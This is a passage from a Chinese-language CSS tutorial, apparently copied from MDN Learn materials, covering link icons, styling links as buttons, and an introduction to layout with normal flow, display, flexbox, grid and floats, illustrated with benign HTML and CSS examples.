class="hljs-number">0</span>;<br>  <span class="hljs-attribute">background-size</span>: <span class="hljs-number">16px</span> <span class="hljs-number">16px</span>;<br>  <span class="hljs-attribute">padding-right</span>: <span class="hljs-number">19px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><iframe class="sample-code-frame" title="在链接中包含图标 sample" id="frame_在链接中包含图标" width="100%" height="150" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/Styling_text/Styling_links/_sample_.%E5%9C%A8%E9%93%BE%E6%8E%A5%E4%B8%AD%E5%8C%85%E5%90%AB%E5%9B%BE%E6%A0%87.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><p>那么这里发生了什么？我们将跳过大部分的 CSS，因为那些只是你之前看过的相同的信息。最后一条规则很有趣，这里，我们在外部链接上插入了一个自定义背景图片，这和上篇<a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/Styling_text/Styling_lists#using_a_custom_bullet_image">自定义列表项目符号</a>文章的做法很像。这次，我们使用了 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/background"><code>background</code></a> 简写，而不是分别使用多个属性。我们设置了我们想要插入的图片的路径，指定了 <code>no-repeat</code> ，这样我们只插入了一次图片，然后指定位置为 100%，使其出现在内容的右边，距离上方是 0px。</p><p>我们也使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/background-size"><code>background-size</code></a> 来指定要显示的背景图像的大小，为了满足响应式网站设计的需要，在图标更大，需要再重新调整它的大小的时候，这样做是很有帮助的。但是，这仅适用于 IE 9 及更高版本。所以你如果需要支持那些老的浏览器，只能调整图像的原始大小，然后插入。</p><p>最后，我们在链接上设置 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/padding-right"><code>padding-right</code></a> ，为背景图片留出空间，这样就不会让它和文本重叠了。</p><p>最后的问题，我们是如何只选中了外部链接的？如果你正确编写你的HTML 链接 ，你应该只会在外部链接上使用绝对 URL，如果链接是链接你的站点的其他部分，那么使用相对链接是更加高效的。因此“http”文本应该只出现在外部链接上，为此我们可以使用一个属性选择器——a[href*&#x3D;”http”] ——选中<code>&lt;a&gt;</code>元素，但是这样只会选中那些拥有 href 属性，且属性的值包含 “http” 的<code>&lt;a&gt;</code>的元素。</p><p>就这样啦，尝试重新审视上面的动手练习部分，尝试这种新技术！</p><p><strong>备注：</strong> 不要担心，如果你目前不熟悉 <a href="https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks">backgrounds</a> 和 <a href="https://developer.mozilla.org/en-US/docs/Web/Progressive_web_apps/Responsive/responsive_design_building_blocks">responsive web design (en-US)</a> ; 这些会在其他地方解释。</p><h4 id="样式化链接为按钮"><a href="#样式化链接为按钮" class="headerlink" title="样式化链接为按钮"></a>样式化链接为按钮</h4><p>目前在本文中探索的用法也可以用在其他方面。比如，悬停 (hover) 的状态可以为不同的元素应用样式，不只是链接，你也许会想添加悬停状态的样式到段落、列表项、或者是其他东西。</p><p>此外，在某些情况下，链接通常会应用样式，使它看上去的效果和按钮差不多，一个网站导航菜单通常是标记为一个列表，列表中包含链接，这可以很容易地被设计为看起来像一组控制按钮或是选项卡，主要是用于让用户可以访问站点的其他部分，现在让我们来看一看。</p><p>首先，一些 HTML:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Pizza<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Music<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Wombats<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Finland<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></td></tr></table></figure><p>接着，是我们的 CSS:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span>,<span class="hljs-selector-tag">html</span> &#123;<br>  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;<br>  <span class="hljs-attribute">font-family</span>: sans-serif;<br>&#125;<br><br><span class="hljs-selector-tag">ul</span> &#123;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;<br>&#125;<br><br><span class="hljs-selector-tag">li</span> &#123;<br>  <span class="hljs-attribute">display</span>: inline;<br>&#125;<br><br><span class="hljs-selector-tag">a</span> &#123;<br>  <span class="hljs-attribute">outline</span>: none;<br>  <span class="hljs-attribute">text-decoration</span>: none;<br>  <span class="hljs-attribute">display</span>: inline-block;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">19.5%</span>;<br>  <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">0.625%</span>;<br>  <span class="hljs-attribute">text-align</span>: center;<br>  <span class="hljs-attribute">line-height</span>: <span class="hljs-number">3</span>;<br>  <span class="hljs-attribute">color</span>: black;<br>&#125;<br><br><span class="hljs-selector-tag">li</span><span class="hljs-selector-pseudo">:last-child</span> <span class="hljs-selector-tag">a</span> &#123;<br>  <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:link</span>, <span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:visited</span>, <span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:focus</span> &#123;<br>  <span class="hljs-attribute">background</span>: yellow;<br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>  <span class="hljs-attribute">background</span>: orange;<br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:active</span> &#123;<br>  <span class="hljs-attribute">background</span>: red;<br>  <span class="hljs-attribute">color</span>: white;<br>&#125;<br></code></pre></td></tr></table></figure><p>这给我们以下结果：</p><iframe class="sample-code-frame" title="样式化链接为按钮 sample" id="frame_样式化链接为按钮" width="100%" height="100" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/Styling_text/Styling_links/_sample_.%E6%A0%B7%E5%BC%8F%E5%8C%96%E9%93%BE%E6%8E%A5%E4%B8%BA%E6%8C%89%E9%92%AE.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><p>让我们来解释一下这里发生了什么，主要是几个有趣的部分：</p><ul><li>我们的第二条规则删除了 <ul> 元素的默认的 padding，然后设置了它的宽度是外部容器 <body> (在这次条件下) 的 100% 。</li><li><li> 元素通常默认是块元素 (可见 types of CSS boxes 回顾)，意味着它们各自会占用一行。在这个例子中，我们创建了一组水平列表的链接，所以在第三条规则中，我们设置了 display 属性为 inline，这会导致列表中的每项内容都会一起出现在同一行，它们现在表现得就像内联元素。</li><li>第四条规则，主要是 <a> 元素的样式，这里比较复杂; 让我们一步一步来看：<ul><li>和前面的例子一样，我们首先关掉了 text-decoration 和 outline，我们不希望这些破坏我们链接的样子。<br>接着，我们设置 display 为 inline-block ，<a> 元素默认为内联元素，而且我们不希望它们像值为 block 时一样，线条超出自己的内容，我们确实想要控制它们的大小inline-block 允许我们这样做。</li><li>接着是尺寸的设置！我们要填满整个 <ul> 的宽度，为按钮之间留一些间距 (margin) (但不是右边边缘的间距)，我们有 5 个按钮需要容纳，所以它们的大小应该一样。为了做到这一点，我们设置 width 为 19.5%，然后 margin-right 为 0.625%. 你会注意到所有宽度加起来是 100.625%, 这样会让最后一个按钮溢出 <ul> ，然后显示到下一行中。但是，我们使用了下一条规则让它恢复到了 100%，这条规则选中了列表中的最后一个 <a>元素，然后删除了它的间距 (margin)。完成！</li><li>最后三条声明就比较简单了，主要是为链接各个状态添加了颜色。我们居中了每个链接中的文本，设置 line-height 为 3，让按钮有一些高度 (这也具有垂直居中文本的优点)，并设置文本的颜色为黑色。</li></ul></li></ul><p><strong>备注：</strong> 你也许会注意到 HTML 中的列表的每项内容都在同一行上，这是因为 inline-block 元素在页面上创建的空格换行符，就像几个字之间的空格，这样的空隙也许会破坏我们的水平导航菜单布局。所以我们删除了空格。你可以在 <a href="https://css-tricks.com/fighting-the-space-between-inline-block-elements/">Fighting the space between inline block elements</a> 找到有关此问题的更多信息（和解决方案）。</p><h3 id="2-13-css布局"><a href="#2-13-css布局" class="headerlink" title="2.13 css布局"></a>2.13 css布局</h3><p>此刻，我们已经看过 CSS 的基础知识，如何设置文本的样式，以及如何设置和操作内容所在的框。现在是时候看看如何把你的盒子放在与视口相关的正确位置上。我们已经涵盖了必要的先决条件，所以我们现在可以深入到 CSS 布局，查看不同的显示设置，涉及浮动和定位的传统布局方法，以及像 flexbox 这样的现代布局工具。</p><p>CSS 页面布局技术允许我们拾取网页中的元素，并且控制它们相对正常布局流、周边元素、父容器或者主视口&#x2F;窗口的位置。在这个模块中将涉及更多关于页面<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Layout_mode">布局技术</a>的细节：</p><ul><li>正常布局流</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/display"><code>display</code></a>属性</li><li>弹性盒子</li><li>网格</li><li>浮动</li><li>定位</li><li>CSS 表格布局</li><li>多列布局</li></ul><p>每种技术都有它们的用途，各有优缺点，相互辅助。通过理解各个布局方法的设计理念，你能够找到构建你想要的网页需要的布局方案。</p><h4 id="正常布局流"><a href="#正常布局流" class="headerlink" title="正常布局流"></a>正常布局流</h4><p>正常布局流（normal flow）是指在不对页面进行任何布局控制时，浏览器默认的 HTML 布局方式。让我们快速地看一个 HTML 的例子：</p><p>注意，HTML 元素完全按照源码中出现的先后次序显示——第一个段落、无序列表、第二个段落。</p><p>出现在另一个元素下面的元素被描述为<strong>块</strong>元素，与出现在另一个元素旁边的<strong>内联元素</strong>不同，内联元素就像段落中的单个单词一样。</p><p>当你使用 css 创建一个布局时，你正在离开<strong>正常布局流</strong>，但是对于页面上的多数元素，<strong>正常布局流</strong>将完全可以创建你所需要的布局。从一个结构良好的 Html 文档开始是非常重要，因为你可以按照默认的方式来搭建页面，而不是自造车轮。</p><p>下列布局技术会覆盖默认的布局行为：</p><ul><li><strong><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/display"><code>display</code></a></strong> 属性 — 标准的 value，比如<code>block</code>, <code>inline</code> 或者 <code>inline-block</code> 元素在正常布局流中的表现形式 (见 <a href="https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/The_box_model#types_of_css_boxes">Types of CSS boxes</a>). 接着是全新的布局方式，通过设置<code>display</code>的值，比如 <a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/CSS_layout/Grids">CSS Grid</a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/CSS_layout/Flexbox">Flexbox</a>.</li><li><strong>浮动</strong>——应用 <strong><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/float"><code>float</code></a></strong> 值，诸如 <code>left</code> 能够让块级元素互相并排成一行，而不是一个堆叠在另一个上面。</li><li><strong><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/position"><code>position</code></a></strong> 属性 — 允许你精准设置盒子中的盒子的位置，正常布局流中，默认为 <code>static</code> ，使用其它值会引起元素不同的布局方式，例如将元素固定到浏览器视口的左上角。</li><li><strong>表格布局</strong>— 表格的布局方式可以用在非表格内容上，可以使用<code>display: table</code>和相关属性在非表元素上使用。</li><li><strong>多列布局</strong>— 这个 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Columns">Multi-column layout</a> 属性 可以让块按列布局，比如报纸的内容就是一列一列排布的。</li></ul><h4 id="display属性"><a href="#display属性" class="headerlink" title="display属性"></a>display属性</h4><p>在 css 中实现页面布局的主要方法是设定display属性的值。此属性允许我们更改默认的显示方式。正常流中的所有内容都有一个display的值，用作元素的默认行为方式。例如，英文段落显示在一个段落的下面，这是因为它们的样式是display:block。如果在段落中的某个文本周围创建链接，则该链接将与文本的其余部分保持内联，并且不会打断到新行。这是因为<a>元素默认为display:inline。</p><p>您可以更改此默认显示行为。例如，<li>元素默认为display:block，这意味着在我们的英文文档中，列表项显示为一个在另一个之下。如果我们将显示值更改为inline，它们现在将显示在彼此旁边，就像单词在句子中所做的那样。事实上，您可以更改任何元素的display值，这意味着您可以根据它们的语义选择 html 元素，而不必关心它们的外观。他们的样子是你可以改变的。</p><p>除了可以通过将一些内容从<code>block</code>转换为<code>inline</code>（反之亦然）来更改默认表示形式之外，还有一些更大的布局方法以<code>display</code>值开始。但是，在使用这些属性时，通常需要调用其他属性。在讨论布局时，对我们来说最重要的两个值是 <code>display: flex</code> 和 <code>display: grid</code>。</p><h4 id="弹性盒子"><a href="#弹性盒子" class="headerlink" title="弹性盒子"></a>弹性盒子</h4><p>Flexbox 是 CSS 弹性盒子布局模块（<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Flexible_Box_Layout">Flexible Box Layout</a> Module）的缩写，它被专门设计出来用于创建横向或是纵向的一维页面布局。要使用 flexbox，你只需要在想要进行 flex 布局的父元素上应用<code>display: flex</code> ，所有直接子元素都将会按照 flex 进行布局。我们来看一个例子。</p><h4 id="设置-display-flex"><a href="#设置-display-flex" class="headerlink" title="设置 display:flex"></a>设置 display:flex</h4><p>下面这些 HTML 标记描述了一个 class 为<code>wrapper</code>的容器元素，它的内部有三个<code>&lt;div&gt;</code>元素。它们在我们的英文文档当中，会默认地作为块元素从上到下进行显示。</p><p>现在，当我们把<code>display: flex</code>添加到它的父元素时，这三个元素就自动按列进行排列。这是由于它们变成了*flex 项 (flex items)*，按照 flex 容器（也就是它们的父元素）的一些 flex 相关的初值进行 flex 布局：它们整整齐齐排成一行，是因为父元素上<code>flex-direction</code>的初值是<code>row</code>。它们全都被拉伸至和最高的元素高度相同，是因为父元素上<code>align-items</code>属性的初值是<code>stretch</code>。这就意味着所有的子元素都会被拉伸到它们的 flex 容器的高度，在这个案例里就是所有 flex 项中最高的一项。所有项目都从容器的开始位置进行排列，排列成一行后，在尾部留下一片空白。</p><h4 id="设置-flex-属性"><a href="#设置-flex-属性" class="headerlink" title="设置 flex 属性"></a>设置 flex 属性</h4><p>除了上述可以被应用到 flex 容器的属性以外，还有很多属性可以被应用到 flex 项 (flex items) 上面。这些属性可以改变 flex 项在 flex 布局中占用宽&#x2F;高的方式，允许它们通过伸缩来适应可用空间。</p><p>作为一个简单的例子，我们可以在我们的所有子元素上添加<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/flex"><code>flex</code></a> 属性，并赋值为<code>1</code>，这会使得所有的子元素都伸展并填充容器，而不是在尾部留下空白，如果有更多空间，那么子元素们就会变得更宽，反之，他们就会变得更窄。除此之外，如果你在 HTML 标记中添加了一个新元素，那么它们也会变得更小，来为新元素创造空间——不管怎样，最终它们会调整自己直到占用相同宽度的空间。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">.<span class="hljs-keyword">wrapper</span> &#123;<br>    display: flex;<br>&#125;<br><br>.<span class="hljs-keyword">wrapper</span> &gt; div &#123;<br>    flex: <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Copy to Clipboard</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">&lt;div <span class="hljs-keyword">class</span>=&quot;<span class="hljs-symbol">wrapper</span>&quot;&gt;<br>    &lt;<span class="hljs-symbol">div</span> <span class="hljs-symbol">class</span>=&quot;<span class="hljs-symbol">box1</span>&quot;&gt;<span class="hljs-symbol">One</span>&lt;/<span class="hljs-symbol">div</span>&gt;<br>    &lt;<span class="hljs-symbol">div</span> <span class="hljs-symbol">class</span>=&quot;<span class="hljs-symbol">box2</span>&quot;&gt;<span class="hljs-symbol">Two</span>&lt;/<span class="hljs-symbol">div</span>&gt;<br>    &lt;<span class="hljs-symbol">div</span> <span class="hljs-symbol">class</span>=&quot;<span class="hljs-symbol">box3</span>&quot;&gt;<span class="hljs-symbol">Three</span>&lt;/<span class="hljs-symbol">div</span>&gt;<br>&lt;/<span class="hljs-symbol">div</span>&gt;<br></code></pre></td></tr></table></figure><p>Copy to Clipboard</p><iframe class="sample-code-frame" title="设置 flex 属性 sample" id="frame_设置_flex_属性" width="300" height="200" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Introduction/_sample_.%E8%AE%BE%E7%BD%AE_flex_%E5%B1%9E%E6%80%A7.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><p><strong>备注：</strong> 为了找到更多关于 Flexbox 的信息，看看我们的 <a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/CSS_layout/Flexbox">Flexbox</a> 的文章。</p><h4 id="Grid布局"><a href="#Grid布局" class="headerlink" title="Grid布局"></a>Grid布局</h4><p>Flexbox 用于设计横向或纵向的布局，而 Grid 布局则被设计用于同时在两个维度上把元素按行和列排列整齐。</p><h4 id="设置-display-grid"><a href="#设置-display-grid" class="headerlink" title="设置 display: grid"></a>设置 display: grid</h4><p>同 flex 一样，你可以通过指定 display 的值来转到 grid 布局：<code>display: grid</code>。下面的例子使用了与 flex 例子类似的 HTML 标记，描述了一个容器和若干子元素。除了使用<code>display:grid</code>，我们还分别使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/grid-template-rows"><code>grid-template-rows</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/grid-template-columns"><code>grid-template-columns</code></a> 两个属性定义了一些行和列的轨道。定义了三个<code>1fr</code>的列，还有两个<code>100px</code>的行之后，无需再在子元素上指定任何规则，它们自动地排列到了我们创建的格子当中。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">.<span class="hljs-keyword">wrapper</span> &#123;<br>    display: grid;<br>    grid-<span class="hljs-keyword">template</span>-<span class="hljs-keyword">columns</span>: <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr;<br>    grid-<span class="hljs-keyword">template</span>-<span class="hljs-keyword">rows</span>: <span class="hljs-number">100</span>px <span class="hljs-number">100</span>px;<br>    grid-gap: <span class="hljs-number">10</span>px;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">&lt;div <span class="hljs-keyword">class</span>=&quot;<span class="hljs-symbol">wrapper</span>&quot;&gt;<br>    &lt;<span class="hljs-symbol">div</span> <span class="hljs-symbol">class</span>=&quot;<span class="hljs-symbol">box1</span>&quot;&gt;<span class="hljs-symbol">One</span>&lt;/<span class="hljs-symbol">div</span>&gt;<br>    &lt;<span class="hljs-symbol">div</span> <span class="hljs-symbol">class</span>=&quot;<span class="hljs-symbol">box2</span>&quot;&gt;<span class="hljs-symbol">Two</span>&lt;/<span class="hljs-symbol">div</span>&gt;<br>    &lt;<span class="hljs-symbol">div</span> <span class="hljs-symbol">class</span>=&quot;<span class="hljs-symbol">box3</span>&quot;&gt;<span class="hljs-symbol">Three</span>&lt;/<span class="hljs-symbol">div</span>&gt;<br>    &lt;<span class="hljs-symbol">div</span> <span class="hljs-symbol">class</span>=&quot;<span class="hljs-symbol">box4</span>&quot;&gt;<span class="hljs-symbol">Four</span>&lt;/<span class="hljs-symbol">div</span>&gt;<br>    &lt;<span class="hljs-symbol">div</span> <span class="hljs-symbol">class</span>=&quot;<span class="hljs-symbol">box5</span>&quot;&gt;<span class="hljs-symbol">Five</span>&lt;/<span class="hljs-symbol">div</span>&gt;<br>    &lt;<span class="hljs-symbol">div</span> <span class="hljs-symbol">class</span>=&quot;<span class="hljs-symbol">box6</span>&quot;&gt;<span class="hljs-symbol">Six</span>&lt;/<span class="hljs-symbol">div</span>&gt;<br>&lt;/<span class="hljs-symbol">div</span>&gt;<br></code></pre></td></tr></table></figure><iframe class="sample-code-frame" title="设置 display: grid sample" id="frame_设置_display_grid" width="300" height="330" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Introduction/_sample_.%E8%AE%BE%E7%BD%AE_display_grid.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><h4 id="在网格内放置元素"><a href="#在网格内放置元素" class="headerlink" title="在网格内放置元素"></a>在网格内放置元素</h4><p>一旦你拥有了一个 grid，你也可以显式地将元素摆放在里面，而不是依赖于浏览器进行自动排列。在下面的第二个例子里，我们定义了一个和上面一样的 grid，但是这一次我们只有三个子元素。我们利用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/grid-column"><code>grid-column</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/grid-row"><code>grid-row</code></a> 两个属性来指定每一个子元素应该从哪一行&#x2F;列开始，并在哪一行&#x2F;列结束。这就能够让子元素在多个行&#x2F;列上展开。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.wrapper</span> &#123;<br>    <span class="hljs-attribute">display</span>: grid;<br>    <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr;<br>    <span class="hljs-attribute">grid-template-rows</span>: <span class="hljs-number">100px</span> <span class="hljs-number">100px</span>;<br>    <span class="hljs-attribute">grid-gap</span>: <span class="hljs-number">10px</span>;<br>&#125;<br><br><span class="hljs-selector-class">.box1</span> &#123;<br>    <span class="hljs-attribute">grid-column</span>: <span class="hljs-number">2</span> / <span class="hljs-number">4</span>;<br>    <span class="hljs-attribute">grid-row</span>: <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-selector-class">.box2</span> &#123;<br>    <span class="hljs-attribute">grid-column</span>: <span class="hljs-number">1</span>;<br>    <span class="hljs-attribute">grid-row</span>: <span class="hljs-number">1</span> / <span class="hljs-number">3</span>;<br>&#125;<br><br><span class="hljs-selector-class">.box3</span> &#123;<br>    <span class="hljs-attribute">grid-row</span>: <span class="hljs-number">2</span>;<br>    <span class="hljs-attribute">grid-column</span>: <span class="hljs-number">3</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">&lt;div <span class="hljs-keyword">class</span>=&quot;<span class="hljs-symbol">wrapper</span>&quot;&gt;<br>    &lt;<span class="hljs-symbol">div</span> <span class="hljs-symbol">class</span>=&quot;<span class="hljs-symbol">box1</span>&quot;&gt;<span class="hljs-symbol">One</span>&lt;/<span class="hljs-symbol">div</span>&gt;<br>    &lt;<span class="hljs-symbol">div</span> <span class="hljs-symbol">class</span>=&quot;<span class="hljs-symbol">box2</span>&quot;&gt;<span class="hljs-symbol">Two</span>&lt;/<span class="hljs-symbol">div</span>&gt;<br>    &lt;<span class="hljs-symbol">div</span> <span class="hljs-symbol">class</span>=&quot;<span class="hljs-symbol">box3</span>&quot;&gt;<span class="hljs-symbol">Three</span>&lt;/<span class="hljs-symbol">div</span>&gt;<br>&lt;/<span class="hljs-symbol">div</span>&gt;<br></code></pre></td></tr></table></figure><iframe class="sample-code-frame" title="在网格内放置元素 sample" id="frame_在网格内放置元素" width="300" height="330" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Introduction/_sample_.%E5%9C%A8%E7%BD%91%E6%A0%BC%E5%86%85%E6%94%BE%E7%BD%AE%E5%85%83%E7%B4%A0.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><p><strong>备注：</strong> 这两个例子只是展示了 grid 布局的冰山一角，要深入了解 grid 布局，请参阅我们的文章<a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/CSS_layout/Grids">Grid Layout</a>。</p><p>这篇指南的其余部分介绍了其他的布局方式，它们与你的页面的主要布局结构关系不大，但是却能够帮助你实现特殊的操作。同时，只要你理解了每一个布局任务的初衷，你就能够马上意识到哪一种布局更适合你的组件。</p><h4 id="浮动"><a href="#浮动" class="headerlink" title="浮动"></a>浮动</h4><p>把一个元素“浮动”(float) 起来，会改变该元素本身和在正常布局流（normal flow）中跟随它的其他元素的行为。这一元素会浮动到左侧或右侧，并且从正常布局流 (normal flow) 中移除，这时候其他的周围内容就会在这个被设置浮动 (<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/float"><code>float</code></a>) 的元素周围环绕。</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/float"><code>float</code></a> 属性有四个可能的值：</p><ul><li><code>left</code> — 将元素浮动到左侧。</li><li><code>right</code> — 将元素浮动到右侧。</li><li><code>none</code> — 默认值，不浮动。</li><li><code>inherit</code> — 继承父元素的浮动属性。</li></ul><p>在下面这个例子当中，我们把一个<code>&lt;div&gt;</code>元素浮动到左侧，并且给了他一个右侧的<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/margin"><code>margin</code></a>，把文字推开。这给了我们文字环绕着这个<code>&lt;div&gt;</code>元素的效果，在现代网页设计当中，这是你唯一需要学会的事情。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code 